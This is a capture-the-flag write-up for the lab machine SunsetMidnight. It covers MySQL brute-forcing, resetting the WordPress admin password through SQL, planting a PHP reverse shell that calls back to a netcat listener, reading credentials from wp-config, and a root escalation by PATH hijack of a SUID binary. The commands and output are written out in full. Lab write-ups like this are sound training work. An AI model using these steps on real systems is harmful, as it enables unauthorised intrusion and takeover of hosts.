# PG Play - SunsetMidnight

#### Ip: 192.168.180.88
#### Name: SunsetMidnight
#### Difficulty: Intermediate
#### Community Rating: Intermediate

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. Here I'll also use the `-sC` and `-sV` flags to use basic scripts and to enumerate versions.

```text
┌──(ryan㉿kali)-[~/PG/SunsetMidnight]
└─$ sudo nmap -p-  --min-rate 10000 192.168.180.88 -sC -sV
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-13 11:03 CDT
Nmap scan report for 192.168.180.88
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)
|   256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)
|_  256 3583682c338bb46c2421200d52edcd16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://sunset-midnight/
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, FoundRows, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SupportsCompression, ConnectWithDatabase, SupportsTransactions, DontAllowDatabaseTableColumn, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: RNm[`PQ&dJ$q1=|}~$4t
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
```

We can see from the Nmap results the site on port 80 is redirecting to http://sunset-midnight/, so lets go ahead and add that to our `/etc/hosts` file.

Now heading to the website we see it is running WordPress.

site.png

After enumerating HTTP for a bit and nit finding much, I decided to kick off password bruteforcing against Mysql on port 3306 using Hydra:

brute.png

Cool, Hydra found a working password. Lets login to the database with this:

```text
┌──(ryan㉿kali)-[~/PG/SunsetMidnight]
└─$ mysql -h 192.168.180.88 -u root -probert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 214
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+
4 rows in set (0.082 sec)
```

After looking through the DB and not finding much of interest (I was unable to crack the Admin password) I decided to change the Admin password:

```text
MariaDB [wordpress_db]> UPDATE wp_users SET user_pass = MD5('password') WHERE wp_users.user_login = "admin";;
Query OK, 1 row affected (0.069 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

We can now head to http://sunset-midnight/wp-admin/ and login to the WordPress site with admin:password.

login.png

### Exploitation

From here lets grab a copy of PentestMonkey's php-reverse-shell.php and overwrite a theme on the WP site.

First we'll need to update the IP and port fields with our correct information:

php.png

Then changing the theme to twentynineteen, I copied the malicious PHP code into the header.php file, and with a NetCat listener going navigating back to http://sunset-midnight to trigger the shell:

```text
┌──(ryan㉿kali)-[~/PG/SunsetMidnight]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.177] from (UNKNOWN) [192.168.180.88] 35938
Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 13:12:09 up  2:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
midnight
```

From here I can grab the local.txt flag:

user_flag.png

### Privilege Escalation

Taking a look in `/var/www/html/wordpress` we can access the wp-config.php file, which has Jose's password:

cred.png

We can use the to `su jose` on the target:

```text
www-data@midnight:/var/www/html/wordpress$ su jose
Password: 
jose@midnight:/var/www/html/wordpress$ whoami
jose
```

From here I'll transfer over LinPEAS to help with enumerating a privilege escalation vector:

transfer.png

LinPEAS finds an interesting file with the SUID bit enabled:

lp.png

Looks like the file is an executable:

```text
night:/tmp$ file /usr/bin/status
/usr/bin/status: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0b60ab071f1d8a6295eedb7f6815e957f2936171, not stripped
```

Using strings we find that the executable is calling service but not using the absolute path. If we create our own service file and update the PATH, we may be able to exploit this:

```text
jose@midnight:/tmp$ touch service
jose@midnight:/tmp$ echo "/bin/sh" > service
jose@midnight:/tmp$ chmod +x ./service
jose@midnight:/tmp$ PATH=/tmp:$PATH
jose@midnight:/tmp$ /usr/bin/status
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)
```

Nice, that worked!

Now lets grab the final flag:

root_flag.png

Thanks for following along!

-Ryan

--------------------------------------------------------